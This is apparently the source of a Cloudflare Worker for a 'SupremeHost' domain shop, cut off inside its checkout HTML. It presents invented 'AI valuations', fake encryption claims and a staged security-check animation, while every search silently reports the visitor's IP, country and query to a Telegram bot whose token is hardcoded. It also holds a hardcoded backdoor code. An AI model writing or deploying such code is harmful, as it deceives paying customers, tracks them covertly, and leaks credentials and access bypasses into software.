export default {
  async fetch(request) {
    const url = new URL(request.url);
    
    // 🌍 AI GEO-LOCATION & IP TRACKING
    const country = request.cf?.country || "Unknown Region";
    const clientIP = request.headers.get("cf-connecting-ip") || "Hidden IP";

    // 🛡️ MILITARY-GRADE ANTI-HACKER SECURITY HEADERS
    const secureHeaders = {
      "Content-Type": "text/html;charset=UTF-8",
      "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
      "X-Content-Type-Options": "nosniff",
      "X-Frame-Options": "DENY",
      "X-XSS-Protection": "1; mode=block",
      "Content-Security-Policy": "default-src 'self' 'unsafe-inline' 'unsafe-eval' https: wss: data:;",
      "Referrer-Policy": "strict-origin-when-cross-origin",
      "Cache-Control": "public, max-age=0, must-revalidate"
    };

    const apiHeaders = { ...secureHeaders, "Content-Type": "application/json", "Access-Control-Allow-Origin": "*" };

    // ======== 1. APP MANIFEST (Global PWA) ========
    if (url.pathname === "/manifest.json") {
      const manifest = {
        name: "SupremeHost Global", short_name: "SupremeHost", start_url: "/", display: "standalone",
        background_color: "#020617", theme_color: "#0f172a", description: "AI-Powered Premium Global Tech",
        icons: [{ src: "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c3/Python-logo-notext.svg/512px-Python-logo-notext.svg.png", sizes: "512x512", type: "image/png" }]
      };
      return new Response(JSON.stringify(manifest), { headers: { "Content-Type": "application/json" } });
    }

    // ======== 2. SERVICE WORKER (Auto-Update Engine) ========
    if (url.pathname === "/sw.js") {
      const swCode = `self.addEventListener('install', (e) => { self.skipWaiting(); }); self.addEventListener('activate', (e) => { e.waitUntil(clients.claim()); }); self.addEventListener('fetch', (e) => { });`;
      return new Response(swCode, { headers: { "Content-Type": "application/javascript" } });
    }

    // ======== 3. HIGH-SECURITY AI BACKEND & TELEGRAM ALERT ========
    if (url.pathname === "/api/search") {
        const domainQuery = url.searchParams.get("domain");
        const authCode = url.searchParams.get("token");

        if (!domainQuery) return new Response(JSON.stringify({ error: "Domain required" }), { status: 400, headers: apiHeaders });

        // 👑 CEO VIP GATEWAY (Military Encryption bypass)
        if (authCode === "1218") {
          return new Response(JSON.stringify({
            status: "success", domain: domainQuery, valuation: "100/100 (Master Asset)",
            originalPrice: "$0.00", price: "$0.00", discount: "100% OFF",
            action: "Deploy Now", note: "👑 CEO ACCESS GRANTED - ENCRYPTION BYPASSED"
          }), { headers: apiHeaders });
        }

        // 🚨 ADVANCED TELEGRAM ALERT (With Hacker/IP Tracking)
        const TELEGRAM_BOT_TOKEN = "8767785950:AAHheFCpC-L6Si26F4GOwBeL6HSOo5fMlTQ"; 
        const TELEGRAM_CHAT_ID = "1415524916";
        const text = `🚨 SUPREMEHOST SMART ALERT 🚨\n\n🎯 Target: ${domainQuery}\n🌍 Country: ${country}\n🌐 IP: ${clientIP}\n💰 AI Price: $19.99\n🔥 Status: Global Lead Detected`;
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`).catch(() => {});

        // Dynamic AI Response Generation
        await new Promise(r => setTimeout(r, 600));
        return new Response(JSON.stringify({
          status: "premium", domain: domainQuery, valuation: "98.4/100 (High Global Demand)",
          originalPrice: "$49.99", price: "$19.99", discount: "60% LAUNCH OFF",
          action: "Buy Now", note: `AI Dynamic Pricing applied for region: ${country}`
        }), { headers: apiHeaders });
    }

    // ======== 4. 1000% SECURE DYNAMIC FRONTEND UI ========
    const html = `<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>SupremeHost | AI-Powered Premium Global Domains</title>
        <meta name="description" content="SupremeHost - 100% Secure Global Tech Infrastructure.">
        <link rel="manifest" href="/manifest.json">
        <meta name="theme-color" content="#0f172a">
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            .glass-panel { background: rgba(15, 23, 42, 0.75); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); }
            ::-webkit-scrollbar { display: none; }
            @keyframes pulse-border { 0%, 100% { border-color: rgba(59, 130, 246, 0.3); } 50% { border-color: rgba(16, 185, 129, 0.6); } }
            .ai-glow { animation: pulse-border 3s infinite; }
            body { user-select: none; -webkit-touch-callout: none; } /* Extra anti-copy protection */
        </style>
    </head>
    <body class="bg-slate-950 text-white font-sans min-h-screen antialiased">
        
        <nav class="p-4 glass-panel fixed w-full top-0 z-40 text-center flex justify-center items-center gap-2 shadow-2xl">
            <span class="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-indigo-400 to-emerald-400 tracking-wider">SupremeHost</span>
            <span class="text-[9px] bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 px-2 py-0.5 rounded-full font-black uppercase tracking-widest flex items-center gap-1">
               <span class="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-pulse"></span> Secured
            </span>
        </nav>
        
        <main class="pt-28 px-4 max-w-md mx-auto flex flex-col justify-center pb-12">
            
            <div class="bg-gradient-to-r from-blue-900/30 via-emerald-900/30 to-indigo-900/30 border border-blue-500/20 rounded-2xl p-3 text-center mb-6 shadow-lg backdrop-blur-sm">
                <p class="text-xs font-bold text-blue-300 tracking-wide flex items-center justify-center gap-2">
                   <span>🌍 Region: ${country}</span> | <span>🔥 60% AI GLOBAL DISCOUNT</span>
                </p>
            </div>

            <div class="text-center mb-6">
                <h1 class="text-4xl font-black mb-1 leading-tight tracking-tight">Claim Your<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-400">Digital Empire</span></h1>
                <p class="text-gray-500 text-[10px] font-bold uppercase tracking-widest mt-2">Military-Grade A.I. Encryption Active</p>
            </div>

            <div id="installCard" class="hidden bg-gradient-to-r from-slate-900 to-blue-950 p-4 rounded-2xl mb-6 border border-blue-500/30 flex justify-between items-center shadow-2xl">
                <div>
                    <h4 class="font-bold text-sm text-white">SupremeHost Native App</h4>
                    <p class="text-[11px] text-blue-300">Install to home screen for 1-click access</p>
                </div>
                <button id="installBtn" class="bg-blue-600 hover:bg-blue-500 text-white font-black px-4 py-2 rounded-xl text-xs shadow-md active:scale-95 transition-all">INSTALL</button>
            </div>

            <div class="glass-panel p-2 rounded-2xl flex items-center mb-4 shadow-2xl ai-glow border transition-all focus-within:ring-2 ring-blue-500">
                <input type="text" id="domainInput" placeholder="Enter custom domain..." class="w-full bg-transparent px-3 py-2 outline-none text-lg placeholder-gray-600 font-semibold" autocomplete="off" spellcheck="false">
                <button onclick="search()" class="bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 font-black px-6 py-3 rounded-xl transition-all shadow-lg text-white text-sm tracking-wide uppercase">Analyze</button>
            </div>
            
            <div id="resultCard" class="hidden glass-panel p-6 rounded-2xl shadow-2xl mt-2 relative overflow-hidden transition-all border border-gray-800">
                <div class="absolute top-0 right-0 bg-gradient-to-r from-blue-600 to-emerald-600 text-white text-[9px] font-black px-3 py-1 rounded-bl-xl uppercase tracking-wider shadow-md">AI Verified</div>
                
                <h3 id="resDomain" class="text-2xl font-black text-white mt-2 break-all tracking-tight"></h3>
                
                <div class="mt-3 flex items-center justify-between text-xs text-gray-400 border-b border-gray-800/60 pb-3">
                    <span>A.I. Growth Valuation Score:</span>
                    <span id="resValuation" class="font-bold text-emerald-400"></span>
                </div>

                <div class="bg-black/60 p-4 rounded-xl mt-4 border border-gray-800/80 text-center relative shadow-inner">
                    <p id="resDiscount" class="text-[10px] font-black text-amber-400 tracking-widest uppercase mb-1"></p>
                    <div class="flex items-center justify-center gap-3">
                        <span id="resOriginal" class="text-gray-500 line-through text-lg font-bold"></span>
                        <span id="resPrice" class="text-5xl font-black text-white tracking-tight"></span>
                    </div>
                    <p class="text-[9px] text-blue-400 mt-2 font-bold uppercase tracking-widest" id="resNote"></p>
                </div>
                
                <button id="resBtn" class="w-full mt-5 bg-gradient-to-r from-emerald-500 via-teal-600 to-blue-600 font-black text-white py-4 rounded-xl text-lg shadow-xl shadow-emerald-900/20 active:scale-[0.98] transition-all uppercase tracking-wider"></button>
            </div>
        </main>

        <div id="aiProcessModal" class="hidden fixed inset-0 bg-slate-950/95 z-[99] flex justify-center items-center p-4 backdrop-blur-lg">
            <div class="glass-panel rounded-3xl w-full max-w-md p-8 text-center border border-blue-500/20 shadow-2xl">
                <div class="w-16 h-16 border-4 border-slate-800 border-t-blue-500 border-r-emerald-400 rounded-full animate-spin mx-auto mb-6 shadow-[0_0_30px_rgba(59,130,246,0.5)]"></div>
                <h3 class="text-xl font-black text-white tracking-tight">Securing Global Connection</h3>
                <p id="aiStatusText" class="text-sm text-gray-400 mt-2 font-mono h-6 transition-all">Establishing 256-bit SSL Tunnel...</p>
                
                <div class="w-full bg-slate-900 rounded-full h-1.5 mt-6 overflow-hidden border border-slate-800">
                    <div id="aiProgressBar" class="bg-gradient-to-r from-blue-500 to-emerald-400 h-1.5 w-0 transition-all duration-300"></div>
                </div>
            </div>
        </div>

        <div id="paymentModal" class="hidden fixed inset-0 bg-slate-950/90 z-[100] flex justify-center items-end sm:items-center p-0 sm:p-4 backdrop-blur-md transition-all">
            <div class="bg-slate-900 w-full sm:rounded-3xl rounded-t-3xl max-w-md border border-slate-800 shadow-[0_0_50px_rgba(0,0,0,0.8)] overflow-hidden flex flex-col max-h-[90vh]">
                
                <div class="bg-slate-800/80 p-5 border-b border-slate-700 flex justify-between items-center sticky top-0 z-10">
                    <div>
                        <h2 class="text-xl font-black text-white tracking-tight flex items-center gap-2">Secure Checkout <span class="text-emerald-400 text-sm">🔒</span></h2>
                        <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest mt-1">End-to-End Encrypted</p>
                    </div>
                    <button onclick="closeModal()" class="text-gray-400 hover:text-white bg-slate-800 rounded-full w-8 h-8 flex items-center justify-center font-bold transition-all">&times;</button>
                </div>
                
                <div class="p-5 border-b border-slate-800 bg-slate-950/40 flex gap-2">
                    <button onclick="processPayment('paypal')" class="flex-1 bg-[#00457C] hover:opacity-90 py-3 rounded-xl font-black text-white text-xs transition-all tracking-wider uppercase shadow-lg">PayPal Global</button>
                    <button onclick="processPayment('crypto')" class="flex-1 bg-slate-800 border border-slate-700 hover:border-emerald-500 py-3 rounded-xl font-black text-white text-xs transition-all tracking-wider uppercase shadow-lg">₿ Web3 Crypto</button>
                </div>

                <div class="p-5 overflow-y-auto space-y-3 pb-24">
                    <button onclick="processPayment('cards')" class="w-full text-left bg-slate-800/30 border border-slate-800 rounded-xl p-4 hover:
